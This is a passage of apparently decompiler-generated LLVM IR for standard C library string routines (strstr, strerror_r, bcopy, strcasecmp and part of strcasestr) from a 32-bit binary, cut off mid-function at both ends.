  %v1_804f2ba = add i32 %v0_804f2be7, 1
  %v1_804f2bb = add i32 %v1_804f2bb8, -1
  %v8_804f2bb = icmp eq i32 %v1_804f2bb, 0
  %v1_804f2bc = icmp eq i1 %v8_804f2bb, false
  br i1 %v1_804f2bc, label %dec_label_pc_804f2b5, label %dec_label_pc_804f2be

dec_label_pc_804f2be:                             ; preds = %dec_label_pc_804f2ba, %dec_label_pc_804f2b5, %entry
  %v0_804f2be.lcssa = phi i32 [ %v4_804f2a8, %entry ], [ %v0_804f2be7, %dec_label_pc_804f2b5 ], [ %v1_804f2ba, %dec_label_pc_804f2ba ]
  %v2_804f2be = sub i32 %v0_804f2be.lcssa, %v4_804f2a8
  ret i32 %v2_804f2be

; uselistorder directives
  uselistorder i32 %v1_804f2bb, { 1, 0 }
  uselistorder i32 %v0_804f2be7, { 0, 2, 1 }
  uselistorder i32 %v4_804f2a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2b5, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f2c7 = load i32, i32* @ebx, align 4
  %v4_804f2cb = ptrtoint i8* %arg2 to i32
  %v2_804f2d3 = load i8, i8* %arg2, align 1
  %v1_804f2d6 = icmp eq i8 %v2_804f2d3, 0
  br i1 %v1_804f2d6, label %dec_label_pc_804f383, label %dec_label_pc_804f2de

dec_label_pc_804f2de:                             ; preds = %entry
  %v1_804f2de = add i32 %arg1, -1
  br label %dec_label_pc_804f2df

dec_label_pc_804f2df:                             ; preds = %dec_label_pc_804f2eb, %dec_label_pc_804f2de
  %v0_804f2df = phi i32 [ %v1_804f2df, %dec_label_pc_804f2eb ], [ %v1_804f2de, %dec_label_pc_804f2de ]
  %v1_804f2df = add i32 %v0_804f2df, 1
  %v1_804f2e0 = inttoptr i32 %v1_804f2df to i8*
  %v2_804f2e0 = load i8, i8* %v1_804f2e0, align 1
  %v1_804f2e3 = icmp eq i8 %v2_804f2e0, 0
  br i1 %v1_804f2e3, label %dec_label_pc_804f381, label %dec_label_pc_804f2eb

dec_label_pc_804f2eb:                             ; preds = %dec_label_pc_804f2df
  %v12_804f2eb = icmp eq i8 %v2_804f2e0, %v2_804f2d3
  %v1_804f2ed = icmp eq i1 %v12_804f2eb, false
  br i1 %v1_804f2ed, label %dec_label_pc_804f2df, label %dec_label_pc_804f2ef

dec_label_pc_804f2ef:                             ; preds = %dec_label_pc_804f2eb
  %v1_804f2ef = add i32 %v4_804f2cb, 1
  %v2_804f2f6 = inttoptr i32 %v1_804f2ef to i8*
  %v3_804f2f6 = load i8, i8* %v2_804f2f6, align 1
  %v1_804f2fd = icmp eq i8 %v3_804f2f6, 0
  br i1 %v1_804f2fd, label %dec_label_pc_804f383, label %dec_label_pc_804f301

dec_label_pc_804f301:                             ; preds = %dec_label_pc_804f2ef
  %v1_804f301 = add i32 %v0_804f2df, 2
  %v1_804f342 = add i32 %v4_804f2cb, 2
  %v2_804f342 = inttoptr i32 %v1_804f342 to i8*
  br label %dec_label_pc_804f334

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f379
  %v2_804f30c = inttoptr i32 %v0_804f347 to i8*
  %v3_804f30c = load i8, i8* %v2_804f30c, align 1
  br label %dec_label_pc_804f329.preheader

dec_label_pc_804f329.preheader:                   ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f334
  %v0_804f315.ph.in = phi i8 [ %v0_804f32927.in, %dec_label_pc_804f334 ], [ %v3_804f30c, %dec_label_pc_804f30c ]
  %v12_804f32954 = icmp eq i8 %v0_804f315.ph.in, %v2_804f2d3
  %v1_804f32b55 = icmp eq i1 %v12_804f32954, false
  br i1 %v1_804f32b55, label %dec_label_pc_804f315, label %dec_label_pc_804f32d

dec_label_pc_804f315:                             ; preds = %dec_label_pc_804f329.preheader, %dec_label_pc_804f325
  %v0_804f31557.in = phi i8 [ %v2_804f326, %dec_label_pc_804f325 ], [ %v0_804f315.ph.in, %dec_label_pc_804f329.preheader ]
  %v0_804f31956 = phi i32 [ %v1_804f325, %dec_label_pc_804f325 ], [ %v0_804f347, %dec_label_pc_804f329.preheader ]
  %v1_804f315 = icmp eq i8 %v0_804f31557.in, 0
  br i1 %v1_804f315, label %dec_label_pc_804f381, label %dec_label_pc_804f319

dec_label_pc_804f319:                             ; preds = %dec_label_pc_804f315
  %v1_804f319 = add i32 %v0_804f31956, 1
  %v1_804f31a = inttoptr i32 %v1_804f319 to i8*
  %v2_804f31a = load i8, i8* %v1_804f31a, align 1
  %v12_804f31d = icmp eq i8 %v2_804f31a, %v2_804f2d3
  br i1 %v12_804f31d, label %dec_label_pc_804f32d, label %dec_label_pc_804f321

dec_label_pc_804f321:                             ; preds = %dec_label_pc_804f319
  %v1_804f321 = icmp eq i8 %v2_804f31a, 0
  br i1 %v1_804f321, label %dec_label_pc_804f381, label %dec_label_pc_804f325

dec_label_pc_804f325:                             ; preds = %dec_label_pc_804f321
  %v1_804f325 = add i32 %v0_804f31956, 2
  %v1_804f326 = inttoptr i32 %v1_804f325 to i8*
  %v2_804f326 = load i8, i8* %v1_804f326, align 1
  %v12_804f329 = icmp eq i8 %v2_804f326, %v2_804f2d3
  %v1_804f32b = icmp eq i1 %v12_804f329, false
  br i1 %v1_804f32b, label %dec_label_pc_804f315, label %dec_label_pc_804f32d

dec_label_pc_804f32d:                             ; preds = %dec_label_pc_804f325, %dec_label_pc_804f319, %dec_label_pc_804f329.preheader
  %v0_804f32d = phi i32 [ %v0_804f347, %dec_label_pc_804f329.preheader ], [ %v1_804f319, %dec_label_pc_804f319 ], [ %v1_804f325, %dec_label_pc_804f325 ]
  %v1_804f32d = add i32 %v0_804f32d, 1
  br label %dec_label_pc_804f334

dec_label_pc_804f334:                             ; preds = %dec_label_pc_804f301, %dec_label_pc_804f32d
  %v0_804f32927.in.in.in = phi i32 [ %v1_804f32d, %dec_label_pc_804f32d ], [ %v1_804f301, %dec_label_pc_804f301 ]
  %v0_804f347 = phi i32 [ %v1_804f32d, %dec_label_pc_804f32d ], [ %v1_804f301, %dec_label_pc_804f301 ]
  %v0_804f32927.in.in = inttoptr i32 %v0_804f32927.in.in.in to i8*
  %v0_804f32927.in = load i8, i8* %v0_804f32927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_804f32927.in, %v3_804f2f6
  %v1_804f334 = icmp eq i1 %storemerge4, false
  br i1 %v1_804f334, label %dec_label_pc_804f329.preheader, label %dec_label_pc_804f336

dec_label_pc_804f336:                             ; preds = %dec_label_pc_804f334
  %v1_804f33e = add i32 %v0_804f347, 1
  %v2_804f33e = inttoptr i32 %v1_804f33e to i8*
  %v3_804f33e = load i8, i8* %v2_804f33e, align 1
  %v3_804f342 = load i8, i8* %v2_804f342, align 1
  %v1_804f34a = add i32 %v0_804f347, -1
  %v12_804f34d = icmp eq i8 %v3_804f33e, %v3_804f342
  %v1_804f34f = icmp eq i1 %v12_804f34d, false
  br i1 %v1_804f34f, label %dec_label_pc_804f379, label %dec_label_pc_804f351.preheader

dec_label_pc_804f351.preheader:                   ; preds = %dec_label_pc_804f336
  %v1_804f35110 = icmp eq i8 %v3_804f33e, 0
  br i1 %v1_804f35110, label %dec_label_pc_804f383, label %dec_label_pc_804f355

dec_label_pc_804f355:                             ; preds = %dec_label_pc_804f351.preheader, %dec_label_pc_804f375
  %v0_804f368 = phi i32 [ %v1_804f368, %dec_label_pc_804f375 ], [ %v1_804f342, %dec_label_pc_804f351.preheader ]
  %v0_804f365 = phi i32 [ %v1_804f365, %dec_label_pc_804f375 ], [ %v1_804f33e, %dec_label_pc_804f351.preheader ]
  %v1_804f355 = add i32 %v0_804f365, 1
  %v2_804f355 = inttoptr i32 %v1_804f355 to i8*
  %v3_804f355 = load i8, i8* %v2_804f355, align 1
  %v1_804f359 = add i32 %v0_804f368, 1
  %v2_804f359 = inttoptr i32 %v1_804f359 to i8*
  %v3_804f359 = load i8, i8* %v2_804f359, align 1
  %v12_804f35d = icmp eq i8 %v3_804f355, %v3_804f359
  %v1_804f35f = icmp eq i1 %v12_804f35d, false
  br i1 %v1_804f35f, label %dec_label_pc_804f379, label %dec_label_pc_804f361

dec_label_pc_804f361:                             ; preds = %dec_label_pc_804f355
  %v1_804f361 = icmp eq i8 %v3_804f359, 0
  br i1 %v1_804f361, label %dec_label_pc_804f383, label %dec_label_pc_804f365

dec_label_pc_804f365:                             ; preds = %dec_label_pc_804f361
  %v1_804f365 = add i32 %v0_804f365, 2
  %v1_804f368 = add i32 %v0_804f368, 2
  %v1_804f36b = inttoptr i32 %v1_804f365 to i8*
  %v2_804f36b = load i8, i8* %v1_804f36b, align 1
  %v1_804f36e = inttoptr i32 %v1_804f368 to i8*
  %v2_804f36e = load i8, i8* %v1_804f36e, align 1
  %v12_804f371 = icmp eq i8 %v2_804f36b, %v2_804f36e
  %v1_804f373 = icmp eq i1 %v12_804f371, false
  br i1 %v1_804f373, label %dec_label_pc_804f379, label %dec_label_pc_804f375

dec_label_pc_804f375:                             ; preds = %dec_label_pc_804f365
  %v1_804f351 = icmp eq i8 %v2_804f36e, 0
  br i1 %v1_804f351, label %dec_label_pc_804f383, label %dec_label_pc_804f355

dec_label_pc_804f379:                             ; preds = %dec_label_pc_804f365, %dec_label_pc_804f355, %dec_label_pc_804f336
  %v0_804f379.in = phi i8 [ %v3_804f342, %dec_label_pc_804f336 ], [ %v2_804f36e, %dec_label_pc_804f365 ], [ %v3_804f359, %dec_label_pc_804f355 ]
  %v1_804f379 = icmp eq i8 %v0_804f379.in, 0
  %v1_804f37b = icmp eq i1 %v1_804f379, false
  br i1 %v1_804f37b, label %dec_label_pc_804f30c, label %dec_label_pc_804f383

dec_label_pc_804f381:                             ; preds = %dec_label_pc_804f2df, %dec_label_pc_804f321, %dec_label_pc_804f315
  br label %dec_label_pc_804f383

dec_label_pc_804f383:                             ; preds = %dec_label_pc_804f351.preheader, %dec_label_pc_804f379, %dec_label_pc_804f361, %dec_label_pc_804f375, %entry, %dec_label_pc_804f2ef, %dec_label_pc_804f381
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f381 ], [ %v1_804f2df, %dec_label_pc_804f2ef ], [ %arg1, %entry ], [ %v1_804f34a, %dec_label_pc_804f375 ], [ %v1_804f34a, %dec_label_pc_804f361 ], [ %v1_804f34a, %dec_label_pc_804f379 ], [ %v1_804f34a, %dec_label_pc_804f351.preheader ]
  store i32 %v0_804f2c7, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_804f36e, { 0, 2, 1 }
  uselistorder i32 %v1_804f368, { 1, 0 }
  uselistorder i32 %v1_804f365, { 1, 0 }
  uselistorder i8 %v3_804f359, { 0, 2, 1 }
  uselistorder i8 %v3_804f33e, { 1, 0 }
  uselistorder i32 %v0_804f347, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_804f32d, { 1, 0 }
  uselistorder i8 %v2_804f326, { 1, 0 }
  uselistorder i32 %v1_804f325, { 0, 2, 1 }
  uselistorder i8 %v2_804f31a, { 1, 0 }
  uselistorder i32 %v0_804f31956, { 1, 0 }
  uselistorder i32 %v1_804f301, { 1, 0 }
  uselistorder i32 %v1_804f2df, { 0, 2, 1 }
  uselistorder i8 %v2_804f2d3, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f383, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_804f381, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f355, { 1, 0 }
  uselistorder label %dec_label_pc_804f334, { 1, 0 }
  uselistorder label %dec_label_pc_804f315, { 1, 0 }
  uselistorder label %dec_label_pc_804f329.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f39d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f3a2 = load i32, i32* @ebx, align 4
  ret i32 %v0_804f3a2
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f3be = icmp ugt i32 %arg1, 124
  br i1 %v6_804f3be, label %dec_label_pc_804f3db, label %dec_label_pc_804f3c0

dec_label_pc_804f3c0:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8056e80.212 to i32), i32* @esi, align 4
  %v1_804f3d04 = icmp eq i32 %arg1, 0
  %v1_804f3d211 = icmp eq i1 %v1_804f3d04, false
  br i1 %v1_804f3d211, label %dec_label_pc_804f3c9, label %dec_label_pc_804f3d4

dec_label_pc_804f3c9:                             ; preds = %dec_label_pc_804f3c0, %dec_label_pc_804f3c9
  %v0_804f3cc = phi i32 [ %v3_804f3cc, %dec_label_pc_804f3c9 ], [ %arg1, %dec_label_pc_804f3c0 ]
  %v0_804f3cf = phi i32 [ %v1_804f3cf, %dec_label_pc_804f3c9 ], [ ptrtoint ([8 x i8]* @global_var_8056e80.212 to i32), %dec_label_pc_804f3c0 ]
  %v1_804f3c9 = inttoptr i32 %v0_804f3cf to i8*
  %v2_804f3c9 = load i8, i8* %v1_804f3c9, align 1
  %v7_804f3c9 = icmp eq i8 %v2_804f3c9, 0
  %v2_804f3cc = zext i1 %v7_804f3c9 to i32
  %v3_804f3cc = add i32 %v2_804f3cc, %v0_804f3cc
  %v16_804f3cc = icmp eq i32 %v3_804f3cc, 0
  %v1_804f3cf = add i32 %v0_804f3cf, 1
  store i32 %v1_804f3cf, i32* @esi, align 4
  %v1_804f3d2 = icmp eq i1 %v16_804f3cc, false
  br i1 %v1_804f3d2, label %dec_label_pc_804f3c9, label %dec_label_pc_804f3d4

dec_label_pc_804f3d4:                             ; preds = %dec_label_pc_804f3c9, %dec_label_pc_804f3c0
  %v0_804f3d6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8056e80.212 to i32), %dec_label_pc_804f3c0 ], [ %v1_804f3cf, %dec_label_pc_804f3c9 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f3d6 = inttoptr i32 %v0_804f3d6 to i8*
  %v2_804f3d6 = load i8, i8* %v1_804f3d6, align 1
  %v3_804f3d6 = icmp eq i8 %v2_804f3d6, 0
  %v1_804f3d9 = icmp eq i1 %v3_804f3d6, false
  br i1 %v1_804f3d9, label %dec_label_pc_804f3d4.dec_label_pc_804f40a_crit_edge, label %dec_label_pc_804f3db

dec_label_pc_804f3d4.dec_label_pc_804f40a_crit_edge: ; preds = %dec_label_pc_804f3d4
  br label %dec_label_pc_804f40a

dec_label_pc_804f3db:                             ; preds = %dec_label_pc_804f3d4, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804f3e3 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804f3ef = bitcast i32* %stack_var_-17 to i8*
  %v7_804f3ef = call i32 @_uintmaxtostr(i8* %v6_804f3ef, i32 %arg1, i32 %v1_804f3e3, i32 -10, i32 0)
  %v1_804f3f7 = add i32 %v7_804f3ef, -14
  store i32 %v1_804f3f7, i32* @esi, align 4
  %v5_804f401 = inttoptr i32 %v1_804f3f7 to i8*
  store i8* %v5_804f401, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f3f7 to i16*
  %v6_804f402 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8056e56.213 to i32), i32 14)
  %v0_804f419.pre = load i32, i32* @edi, align 4
  %v0_804f41b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f40a

dec_label_pc_804f40a:                             ; preds = %dec_label_pc_804f3d4.dec_label_pc_804f40a_crit_edge, %dec_label_pc_804f3db
  %v0_804f41b = phi i32 [ %v0_804f3d6, %dec_label_pc_804f3d4.dec_label_pc_804f40a_crit_edge ], [ %v0_804f41b.pre, %dec_label_pc_804f3db ]
  %v0_804f419 = phi i32 [ %arg3, %dec_label_pc_804f3d4.dec_label_pc_804f40a_crit_edge ], [ %v0_804f419.pre, %dec_label_pc_804f3db ]
  %v4_804f40c = icmp eq i32 %arg2, 0
  %v1_804f411 = icmp eq i1 %v4_804f40c, false
  %v2_804f419 = select i1 %v1_804f411, i32 %v0_804f419, i32 0
  store i32 %v2_804f419, i32* @edi, align 4
  %v5_804f41b = inttoptr i32 %v0_804f41b to i8*
  store i8* %v5_804f41b, i8** %stack_var_-108, align 4
  %v3_804f41c = call i32 @strlen(i8* %v5_804f41b)
  %v1_804f424 = add i32 %v3_804f41c, 1
  store i32 %v1_804f424, i32* %ebx.global-to-local, align 4
  %v1_804f427 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804f424, %v1_804f427
  br i1 %tmp46, label %dec_label_pc_804f42b, label %dec_label_pc_804f432

dec_label_pc_804f42b:                             ; preds = %dec_label_pc_804f40a
  store i32 %v1_804f427, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f432

dec_label_pc_804f432:                             ; preds = %dec_label_pc_804f40a, %dec_label_pc_804f42b
  %v0_804f437 = phi i32 [ %v1_804f424, %dec_label_pc_804f40a ], [ %v1_804f427, %dec_label_pc_804f42b ]
  %v1_804f432 = icmp eq i32 %v0_804f437, 0
  br i1 %v1_804f432, label %dec_label_pc_804f44e, label %dec_label_pc_804f436

dec_label_pc_804f436:                             ; preds = %dec_label_pc_804f432
  %v0_804f438 = load i32, i32* @esi, align 4
  %v8_804f439 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f439, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f43d = call i32 @memcpy(i16* %tmp45, i32 %v0_804f438, i32 %v0_804f437)
  %v1_804f449 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f449 = add i32 %arg2, -1
  %v3_804f449 = add i32 %v2_804f449, %v1_804f449
  %v4_804f449 = inttoptr i32 %v3_804f449 to i8*
  store i8 0, i8* %v4_804f449, align 1
  br label %dec_label_pc_804f44e

dec_label_pc_804f44e:                             ; preds = %dec_label_pc_804f432, %dec_label_pc_804f436
  %v0_804f44e = load i32, i32* @ebp, align 4
  %v1_804f44e = icmp eq i32 %v0_804f44e, 0
  br i1 %v1_804f44e, label %dec_label_pc_804f459, label %dec_label_pc_804f452

dec_label_pc_804f452:                             ; preds = %dec_label_pc_804f44e
  %v0_804f452 = load i8*, i8** %stack_var_-108, align 4
  %v1_804f452 = ptrtoint i8* %v0_804f452 to i32
  %v2_804f452 = call i32 @__errno_location(i32 %v1_804f452)
  %v0_804f457 = load i32, i32* @ebp, align 4
  %v2_804f457 = inttoptr i32 %v2_804f452 to i32*
  store i32 %v0_804f457, i32* %v2_804f457, align 4
  %v0_804f45c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f459

dec_label_pc_804f459:                             ; preds = %dec_label_pc_804f44e, %dec_label_pc_804f452
  %v0_804f45c = phi i32 [ 0, %dec_label_pc_804f44e ], [ %v0_804f45c.pre, %dec_label_pc_804f452 ]
  ret i32 %v0_804f45c

; uselistorder directives
  uselistorder i32 %v1_804f427, { 1, 2, 0 }
  uselistorder i32 %v1_804f424, { 1, 0, 2 }
  uselistorder i32 %v1_804f3f7, { 1, 0, 2 }
  uselistorder i32 %v1_804f3cf, { 0, 2, 1 }
  uselistorder i32 %v3_804f3cc, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8056e80.212 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f459, { 1, 0 }
  uselistorder label %dec_label_pc_804f44e, { 1, 0 }
  uselistorder label %dec_label_pc_804f432, { 1, 0 }
  uselistorder label %dec_label_pc_804f40a, { 1, 0 }
  uselistorder label %dec_label_pc_804f3c9, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f474 = inttoptr i32 %arg2 to i8*
  %v3_804f474 = call i32 @memmove(i8* %v2_804f474, i32 %arg1)
  ret i32 %v3_804f474
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f47e = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f47e, i32* @ecx, align 4
  %v0_804f488 = load i32, i32* bitcast (i32** @global_var_805a120.215 to i32*), align 32
  br label %dec_label_pc_804f48e

dec_label_pc_804f48e:                             ; preds = %dec_label_pc_804f4ab, %entry
  %v0_804f4b16 = phi i32 [ %v0_804f4b17, %dec_label_pc_804f4ab ], [ 0, %entry ]
  %v0_804f4ab = phi i32 [ %v1_804f4ab, %dec_label_pc_804f4ab ], [ %arg2, %entry ]
  %v0_804f4ac = phi i32 [ %v1_804f4ac, %dec_label_pc_804f4ab ], [ %v4_804f47e, %entry ]
  %v12_804f48e = icmp eq i32 %v0_804f4ac, %v0_804f4ab
  %.pre = inttoptr i32 %v0_804f4ac to i8*
  br i1 %v12_804f48e, label %dec_label_pc_804f4a6, label %dec_label_pc_804f492

dec_label_pc_804f492:                             ; preds = %dec_label_pc_804f48e
  %v2_804f492 = load i8, i8* %.pre, align 1
  %v3_804f492 = zext i8 %v2_804f492 to i32
  %v2_804f495 = mul nuw nsw i32 %v3_804f492, 2
  %v3_804f495 = add i32 %v2_804f495, %v0_804f488
  %v4_804f495 = inttoptr i32 %v3_804f495 to i16*
  %v5_804f495 = load i16, i16* %v4_804f495, align 2
  %v6_804f495 = sext i16 %v5_804f495 to i32
  %v1_804f499 = inttoptr i32 %v0_804f4ab to i8*
  %v2_804f499 = load i8, i8* %v1_804f499, align 1
  %v3_804f499 = zext i8 %v2_804f499 to i32
  %v2_804f49c = mul nuw nsw i32 %v3_804f499, 2
  %v3_804f49c = add i32 %v2_804f49c, %v0_804f488
  %v4_804f49c = inttoptr i32 %v3_804f49c to i16*
  %v5_804f49c = load i16, i16* %v4_804f49c, align 2
  %v6_804f49c = sext i16 %v5_804f49c to i32
  %v2_804f4a0 = sub nsw i32 %v6_804f495, %v6_804f49c
  %v12_804f4a0 = icmp eq i32 %v2_804f4a0, 0
  store i32 %v2_804f4a0, i32* @edx, align 4
  %v1_804f4a4 = icmp eq i1 %v12_804f4a0, false
  br i1 %v1_804f4a4, label %dec_label_pc_804f4af, label %dec_label_pc_804f4a6

dec_label_pc_804f4a6:                             ; preds = %dec_label_pc_804f48e, %dec_label_pc_804f492
  %v0_804f4b17 = phi i32 [ %v2_804f4a0, %dec_label_pc_804f492 ], [ %v0_804f4b16, %dec_label_pc_804f48e ]
  %v2_804f4a6 = load i8, i8* %.pre, align 1
  %v3_804f4a6 = icmp eq i8 %v2_804f4a6, 0
  br i1 %v3_804f4a6, label %dec_label_pc_804f4af, label %dec_label_pc_804f4ab

dec_label_pc_804f4ab:                             ; preds = %dec_label_pc_804f4a6
  %v1_804f4ab = add i32 %v0_804f4ab, 1
  %v1_804f4ac = add i32 %v0_804f4ac, 1
  store i32 %v1_804f4ac, i32* @ecx, align 4
  br label %dec_label_pc_804f48e

dec_label_pc_804f4af:                             ; preds = %dec_label_pc_804f4a6, %dec_label_pc_804f492
  %v0_804f4b1 = phi i32 [ %v0_804f4b17, %dec_label_pc_804f4a6 ], [ %v2_804f4a0, %dec_label_pc_804f492 ]
  ret i32 %v0_804f4b1

; uselistorder directives
  uselistorder i32 %v1_804f4ac, { 1, 0 }
  uselistorder i32 %v0_804f4b17, { 1, 0 }
  uselistorder i32 %v2_804f4a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f4ac, { 2, 1, 0 }
  uselistorder i32 %v0_804f4ab, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f4a6, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f4b7 = load i32, i32* @ebx, align 4
  %v4_804f4bb = ptrtoint i8* %arg1 to i32
  %v1_804f4c718 = inttoptr i32 %arg2 to i8*
  %v2_804f4c71931 = load i8, i8* %v1_804f4c718, align 1
  %v4_804f4c92335 = icmp eq i8 %v2_804f4c71931, 0
  %v1_804f4cb2436 = icmp eq i1 %v4_804f4c92335, false
  br i1 %v1_804f4cb2436, label %dec_label_pc_804f4d1.lr.ph.lr.ph, label %dec_label_pc_804f501

dec_label_pc_804f4d1.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804f4c72032 = zext i8 %v2_804f4c71931 to i32
  %v4_804f4c7.pre.pre = load i32, i32* @eax, align 4
  %v5_804f4c72133 = and i32 %v4_804f4c7.pre.pre, -256
  %v6_804f4c72234 = or i32 %v3_804f4c72032, %v5_804f4c72133
  %v4_804f4d1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f4d1.lr.ph

dec_label_pc_804f4d1.lr.ph:                       ; preds = %dec_label_pc_804f4d1.lr.ph.lr.ph, %dec_label_pc_804f4fc
  %v4_804f4d1.pre = phi i32 [ %v4_804f4d1.pre.pre, %dec_label_pc_804f4d1.lr.ph.lr.ph ], [ %v0_804f4de, %dec_label_pc_804f4fc ]
  %v6_804f4c72239 = phi i32 [ %v6_804f4c72234, %dec_label_pc_804f4d1.lr.ph.lr.ph ], [ %v6_804f4c722, %dec_label_pc_804f4fc ]
  %v2_804f4c71938 = phi i8 [ %v2_804f4c71931, %dec_label_pc_804f4d1.lr.ph.lr.ph ], [ %v2_804f4c719, %dec_label_pc_804f4fc ]
  %v0_804f4fc37 = phi i32 [ %v4_804f4bb, %dec_label_pc_804f4d1.lr.ph.lr.ph ], [ %v1_804f4fc, %dec_label_pc_804f4fc ]
  br label %dec_label_pc_804f4d1

dec_label_pc_804f4d1:                             ; preds = %dec_label_pc_804f4d1.lr.ph, %dec_label_pc_804f4f1
  %v4_804f4d1 = phi i32 [ %v4_804f4d1.pre, %dec_label_pc_804f4d1.lr.ph ], [ %v4_804f4d144, %dec_label_pc_804f4f1 ]
  %v6_804f4c729 = phi i32 [ %v6_804f4c72239, %dec_label_pc_804f4d1.lr.ph ], [ %v6_804f4c7, %dec_label_pc_804f4f1 ]
  %v2_804f4c728 = phi i8 [ %v2_804f4c71938, %dec_label_pc_804f4d1.lr.ph ], [ %v2_804f4c7, %dec_label_pc_804f4f1 ]
  %v1_804f4c727 = phi i8* [ %v1_804f4c718, %dec_label_pc_804f4d1.lr.ph ], [ %v1_804f4c7, %dec_label_pc_804f4f1 ]
  %v0_804f4f126 = phi i32 [ %arg2, %dec_label_pc_804f4d1.lr.ph ], [ %v1_804f4f1, %dec_label_pc_804f4f1 ]
  %v0_804f4f225 = phi i32 [ %v0_804f4fc37, %dec_label_pc_804f4d1.lr.ph ], [ %v1_804f4f2, %dec_label_pc_804f4f1 ]
  %v1_804f4d1 = inttoptr i32 %v0_804f4f225 to i8*
  %v2_804f4d1 = load i8, i8* %v1_804f4d1, align 1
  %v3_804f4d1 = zext i8 %v2_804f4d1 to i32
  %v5_804f4d1 = and i32 %v4_804f4d1, -256
  %v6_804f4d1 = or i32 %v5_804f4d1, %v3_804f4d1
  %v15_804f4d7 = icmp eq i8 %v2_804f4c728, %v2_804f4d1
  br i1 %v15_804f4d7, label %dec_label_pc_804f4f1, label %dec_label_pc_804f4db

dec_label_pc_804f4db:                             ; preds = %dec_label_pc_804f4d1
  %v2_804f4db = load i8, i8* %v1_804f4d1, align 1
  %v3_804f4db = zext i8 %v2_804f4db to i32
  %v0_804f4de = load i32, i32* bitcast (i32** @global_var_805a120.215 to i32*), align 32
  %v2_804f4e4 = load i8, i8* %v1_804f4c727, align 1
  %v3_804f4e4 = zext i8 %v2_804f4e4 to i32
  %v2_804f4e7 = mul nuw nsw i32 %v3_804f4db, 2
  %v3_804f4e7 = add i32 %v2_804f4e7, %v0_804f4de
  %v4_804f4e7 = inttoptr i32 %v3_804f4e7 to i16*
  %v5_804f4e7 = load i16, i16* %v4_804f4e7, align 2
  %v6_804f4e7 = zext i16 %v5_804f4e7 to i32
  %v4_804f4eb = mul nuw nsw i32 %v3_804f4e4, 2
  %v5_804f4eb = add i32 %v4_804f4eb, %v0_804f4de
  %v6_804f4eb = inttoptr i32 %v5_804f4eb to i16*
  %v7_804f4eb = load i16, i16* %v6_804f4eb, align 2
  %v18_804f4eb = icmp eq i16 %v5_804f4e7, %v7_804f4eb
  %v1_804f4ef = icmp eq i1 %v18_804f4eb, false
  br i1 %v1_804f4ef, label %dec_label_pc_804f4f5, label %dec_label_pc_804f4f1

dec_label_pc_804f4f1:                             ; preds = %dec_label_pc_804f4db, %dec_label_pc_804f4d1
  %v4_804f4d144 = phi i32 [ %v0_804f4de, %dec_label_pc_804f4db ], [ %v6_804f4d1, %dec_label_pc_804f4d1 ]
  %v4_804f4c76 = phi i32 [ %v6_804f4e7, %dec_label_pc_804f4db ], [ %v6_804f4c729, %dec_label_pc_804f4d1 ]
  %v1_804f4f1 = add i32 %v0_804f4f126, 1
  %v1_804f4f2 = add i32 %v0_804f4f225, 1
  %v1_804f4c7 = inttoptr i32 %v1_804f4f1 to i8*
  %v2_804f4c7 = load i8, i8* %v1_804f4c7, align 1
  %v3_804f4c7 = zext i8 %v2_804f4c7 to i32
